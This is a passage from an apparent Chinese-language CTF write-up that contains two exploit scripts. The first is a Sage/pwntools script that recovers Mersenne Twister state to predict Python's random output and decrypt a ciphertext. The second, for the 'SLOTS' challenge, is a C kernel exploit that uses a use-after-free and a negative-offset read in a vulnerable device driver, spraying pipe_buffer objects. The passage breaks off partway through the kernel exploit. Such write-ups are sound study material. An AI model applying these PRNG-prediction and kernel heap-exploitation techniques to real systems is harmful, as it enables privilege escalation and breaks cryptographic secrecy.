</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Enter your choice:&#39;</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;do with it:  &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>x</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>()[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>candidate</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>x</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;candidate =&#34;</span><span class=p>,</span><span class=n>candidate</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Enter your choice:&#39;</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>x</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;it... chat? &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>c</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>()[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;c = &#34;</span><span class=p>,</span><span class=n>c</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>对于接收到的数据，设为矩阵S，对于状态矩阵设为x，这个矩阵必然有下面的式子，而T矩阵需要构造：</p><p><strong>x</strong>⋅<em>T</em>=<strong>s</strong></p><p>对于确定矩阵T的方法可以使用黑盒调用，也就是通过调用从而构造出来。构造出来后就可以通过矩阵运算解出状态矩阵x，注意：需要在模2的条件上解状态矩阵x。从而预测出MT19937。最终的exp如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>random</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=n>long_to_bytes</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>tqdm</span> <span class=kn>import</span> <span class=n>trange</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>sage.all</span> <span class=kn>import</span> <span class=n>Matrix</span><span class=p>,</span> <span class=n>GF</span><span class=p>,</span> <span class=n>vector</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>RNG</span> <span class=o>=</span> <span class=n>Random</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>n</span> <span class=o>=</span> <span class=mi>2</span><span class=o>^</span><span class=mi>26</span>
</span></span><span class=line><span class=cl><span class=c1># 数据量1300</span>
</span></span><span class=line><span class=cl><span class=n>candidate</span> <span class=o>=</span> 
</span></span><span class=line><span class=cl><span class=n>c</span> <span class=o>=</span>  
</span></span><span class=line><span class=cl><span class=n>leng</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>candidate</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>construct_a_row</span><span class=p>(</span><span class=n>RNG</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>row</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>candidate</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>    <span class=c1># 必须要与题目随机数生成的方式一直</span>
</span></span><span class=line><span class=cl>        <span class=n>row</span> <span class=o>+=</span> <span class=nb>list</span><span class=p>(</span><span class=nb>map</span><span class=p>(</span><span class=nb>int</span><span class=p>,</span> <span class=p>(</span><span class=nb>bin</span><span class=p>(</span><span class=n>RNG</span><span class=o>.</span><span class=n>choices</span><span class=p>(</span><span class=nb>range</span><span class=p>(</span><span class=n>n</span><span class=p>),</span> <span class=n>k</span><span class=o>=</span><span class=mi>1</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span> <span class=o>&gt;&gt;</span> <span class=mi>0</span><span class=p>)[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>zfill</span><span class=p>(</span><span class=mi>26</span><span class=p>))))</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>row</span>
</span></span><span class=line><span class=cl><span class=n>L</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>trange</span><span class=p>(</span><span class=mi>19968</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>state</span> <span class=o>=</span> <span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>*</span><span class=mi>624</span>
</span></span><span class=line><span class=cl>    <span class=n>temp</span> <span class=o>=</span> <span class=s2>&#34;0&#34;</span><span class=o>*</span><span class=n>i</span> <span class=o>+</span> <span class=s2>&#34;1&#34;</span><span class=o>*</span><span class=mi>1</span> <span class=o>+</span> <span class=s2>&#34;0&#34;</span><span class=o>*</span><span class=p>(</span><span class=mi>19968</span><span class=o>-</span><span class=mi>1</span><span class=o>-</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>624</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>state</span><span class=p>[</span><span class=n>j</span><span class=p>]</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>temp</span><span class=p>[</span><span class=mi>32</span><span class=o>*</span><span class=n>j</span><span class=p>:</span><span class=mi>32</span><span class=o>*</span><span class=n>j</span><span class=o>+</span><span class=mi>32</span><span class=p>],</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>RNG</span><span class=o>.</span><span class=n>setstate</span><span class=p>((</span><span class=mi>3</span><span class=p>,</span><span class=nb>tuple</span><span class=p>(</span><span class=n>state</span><span class=o>+</span><span class=p>[</span><span class=mi>624</span><span class=p>]),</span><span class=kc>None</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>L</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>construct_a_row</span><span class=p>(</span><span class=n>RNG</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>L</span> <span class=o>=</span> <span class=n>Matrix</span><span class=p>(</span><span class=n>GF</span><span class=p>(</span><span class=mi>2</span><span class=p>),</span><span class=n>L</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>R</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>candidate</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>    <span class=n>R</span> <span class=o>+=</span> <span class=nb>list</span><span class=p>(</span><span class=nb>map</span><span class=p>(</span><span class=nb>int</span><span class=p>,</span> <span class=nb>bin</span><span class=p>(</span><span class=n>candidate</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>&gt;&gt;</span> <span class=mi>0</span><span class=p>)[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>zfill</span><span class=p>(</span><span class=mi>26</span><span class=p>)))</span>
</span></span><span class=line><span class=cl><span class=n>R</span> <span class=o>=</span> <span class=n>vector</span><span class=p>(</span><span class=n>GF</span><span class=p>(</span><span class=mi>2</span><span class=p>),</span><span class=n>R</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span> <span class=o>=</span> <span class=n>L</span><span class=o>.</span><span class=n>solve_left</span><span class=p>(</span><span class=n>R</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>init</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=nb>list</span><span class=p>(</span><span class=nb>map</span><span class=p>(</span><span class=nb>str</span><span class=p>,</span><span class=n>s</span><span class=p>)))</span>
</span></span><span class=line><span class=cl><span class=n>state</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>624</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>state</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>init</span><span class=p>[</span><span class=mi>32</span><span class=o>*</span><span class=n>i</span><span class=p>:</span><span class=mi>32</span><span class=o>*</span><span class=n>i</span><span class=o>+</span><span class=mi>32</span><span class=p>],</span><span class=mi>2</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>RNG1</span> <span class=o>=</span> <span class=n>Random</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>RNG1</span><span class=o>.</span><span class=n>setstate</span><span class=p>((</span><span class=mi>3</span><span class=p>,</span><span class=nb>tuple</span><span class=p>(</span><span class=n>state</span><span class=o>+</span><span class=p>[</span><span class=mi>624</span><span class=p>]),</span><span class=kc>None</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>leng</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>RNG1</span><span class=o>.</span><span class=n>choices</span><span class=p>(</span><span class=nb>range</span><span class=p>(</span><span class=n>n</span><span class=p>),</span> <span class=n>k</span><span class=o>=</span><span class=mi>1</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>idxs</span> <span class=o>=</span> <span class=p>[</span><span class=n>i</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>256</span><span class=p>)]</span>
</span></span><span class=line><span class=cl><span class=n>key</span> <span class=o>=</span> <span class=n>RNG1</span><span class=o>.</span><span class=n>choices</span><span class=p>(</span><span class=n>idxs</span><span class=p>,</span> <span class=n>k</span><span class=o>=</span><span class=nb>len</span><span class=p>(</span><span class=n>c</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>omlet</span> <span class=o>=</span> <span class=p>[</span><span class=n>c</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>^^</span> <span class=n>key</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>c</span><span class=p>))]</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>key</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>omlet</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=nb>chr</span><span class=p>(</span><span class=n>omlet</span><span class=p>[</span><span class=n>i</span><span class=p>]),</span><span class=n>end</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h1 id=pwn>Pwn</h1><h2 id=slots>SLOTS</h2><p>内核baby题，UAF 漏洞 + 可以 负向 溢出</p><p>不是很熟悉内核的的堆，代码都是瞎几把写的，不过还是做出来了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&#34;minilib.h&#34;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>char</span> <span class=n>VULN_DEVICE</span><span class=p>[]</span> <span class=o>=</span> <span class=s>&#34;/dev/slot_machine&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=n>fd</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>odp</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=n>path</span><span class=p>){</span> <span class=k>return</span> <span class=nf>open</span><span class=p>(</span><span class=n>path</span><span class=p>,</span> <span class=mi>2</span><span class=p>);</span> <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>mytest</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>offset</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=o>*</span><span class=n>buf</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>pipe_buffer</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>page</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>offset</span><span class=p>,</span> <span class=n>len</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>ops</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>flags</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>private</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>rm</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>    <span class=nf>ioctl</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>add</span><span class=p>(</span><span class=kt>size_t</span> <span class=n>size</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>sz</span> <span class=o>=</span> <span class=n>size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>ioctl</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=p>(</span><span class=kt>size_t</span><span class=p>)</span><span class=o>&amp;</span><span class=n>sz</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>show</span><span class=p>(</span><span class=kt>size_t</span> <span class=n>o</span><span class=p>,</span> <span class=kt>size_t</span> <span class=n>s</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>b</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>mytest</span> <span class=n>temp</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=p>.</span><span class=n>offset</span> <span class=o>=</span> <span class=n>o</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=p>.</span><span class=n>size</span> <span class=o>=</span> <span class=n>s</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=p>.</span><span class=n>buf</span> <span class=o>=</span> <span class=n>b</span>
</span></span><span class=line><span class=cl>    <span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=nf>ioctl</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=mi>1337</span><span class=p>,</span> <span class=p>(</span><span class=kt>size_t</span><span class=p>)</span><span class=o>&amp;</span><span class=n>temp</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>edit</span><span class=p>(</span><span class=kt>size_t</span> <span class=n>o</span><span class=p>,</span> <span class=kt>size_t</span> <span class=n>s</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>b</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>mytest</span> <span class=n>temp</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=p>.</span><span class=n>offset</span> <span class=o>=</span> <span class=n>o</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=p>.</span><span class=n>size</span> <span class=o>=</span> <span class=n>s</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=p>.</span><span class=n>buf</span> <span class=o>=</span> <span class=n>b</span>
</span></span><span class=line><span class=cl>    <span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=nf>ioctl</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=mi>3</span><span class=p>,</span> <span class=p>(</span><span class=kt>size_t</span><span class=p>)</span><span class=o>&amp;</span><span class=n>temp</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>pipe</span><span class=p>(</span><span class=kt>int</span> <span class=n>pfd</span><span class=p>[</span><span class=mi>2</span><span class=p>])</span> <span class=p>{</span> <span class=k>return</span> <span class=nf>syscall64</span><span class=p>(</span><span class=mi>22</span><span class=p>,</span> <span class=n>pfd</span><span class=p>);</span> <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>doMain</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>fd</span> <span class=o>=</span> <span class=nf>odp</span><span class=p>(</span><span class=n>VULN_DEVICE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>lss</span><span class=p>(</span><span class=s>&#34;fd&#34;</span><span class=p>,</span> <span class=n>fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=o>*</span><span class=n>ptr</span> <span class=o>=</span> <span class=p>(</span><span class=kt>size_t</span><span class=o>*</span><span class=p>)</span><span class=nf>malloc</span><span class=p>(</span><span class=mh>0x1000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>memset</span><span class=p>((</span><span class=kt>void</span><span class=o>*</span><span class=p>)</span><span class=n>ptr</span><span class=p>,</span> <span class=mh>0x41</span><span class=p>,</span> <span class=mh>0x1000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>pfd</span><span class=p>[</span><span class=mh>0x100</span><span class=p>][</span><span class=mi>2</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span><span class=p>(</span><span class=kt>int</span> <span class=n>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span><span class=n>i</span><span class=o>&lt;</span><span class=mh>0x80</span><span class=p>;</span><span class=n>i</span><span class=o>++</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=nf>pipe</span><span class=p>(</span><span class=n>pfd</span><span class=p>[</span><span class=n>i</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>add</span><span class=p>(</span><span class=mh>0x400</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x10</span><span class=p>,(</span><span class=kt>char</span><span class=o>*</span><span class=p>)</span><span class=n>ptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>rm</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span><span class=p>(</span><span class=kt>int</span> <span class=n>i</span><span class=o>=</span><span class=mh>0x80</span><span class=p>;</span><span class=n>i</span><span class=o>&lt;</span><span class=mh>0x100</span><span class=p>;</span><span class=n>i</span><span class=o>++</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=nf>pipe</span><span class=p>(</span><span class=n>pfd</span><span class=p>[</span><span class=n>i</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=o>*</span><span class=n>tmp_buf</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span><span class=o>*</span><span class=p>)</span><span class=nf>malloc</span><span class=p>(</span><span class=mh>0x1000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>memset</span><span class=p>((</span><span class=kt>void</span><span class=o>*</span><span class=p>)</span><span class=n>tmp_buf</span><span class=p>,</span> <span class=mh>0x59</span><span class=p>,</span> <span class=mh>0xFFF</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span><span class=p>(</span><span class=kt>int</span> <span class=n>i</span><span class=o>=</span><span class=mh>0x81</span><span class=p>;</span><span class=n>i</span><span class=o>&lt;</span><span class=mh>0x100</span><span class=p>;</span><span class=n>i</span><span class=o>+=</span><span class=mi>2</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=nf>write</span><span class=p>(</span><span class=n>pfd</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=mi>1</span><span class=p>],</span><span class=n>tmp_buf</span><span class=p>,</span><span class=mh>0x800</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=o>*</span><span class=n>out</span> <span class=o>=</span> <span class=p>(</span><span class=kt>size_t</span><span class=o>*</span><span class=p>)</span><span class=nf>malloc</span><span class=p>(</span><span class=mh>0x1000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>tmp</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span><span class=p>(</span><span class=kt>int</span> <span class=n>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span><span class=n>i</span><span class=o>&lt;</span><span class=mh>0x100</span><span class=p>;</span><span class=n>i</span><span class=o>++</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=n>tmp</span> <span class=o>=</span> <span class=n>i</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nf>show</span><span class=p>(</span><span class=o>-</span><span class=mh>0x400</span><span class=o>*</span><span class=n>i</span><span class=p>,</span><span class=mi>1</span> <span class=o>+</span> <span class=mh>0x400</span><span class=o>*</span><span class=n>i</span><span class=p>,(</span><span class=kt>char</span><span class=o>*</span><span class=p>)</span><span class=n>out</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=n>out</span><span class=p>[</span><span class=mi>0</span><span class=p>]){</span>
</span></span><span class=line><span class=cl>            <span class=nf>hexdump</span><span class=p>((</span><span class=kt>unsigned</span> <span class=kt>char</span><span class=o>*</span><span class=p>)</span><span class=n>out</span><span class=p>,</span><span class=mh>0x50</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nf>hex</span><span class=p>(</span><span class=n>i</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
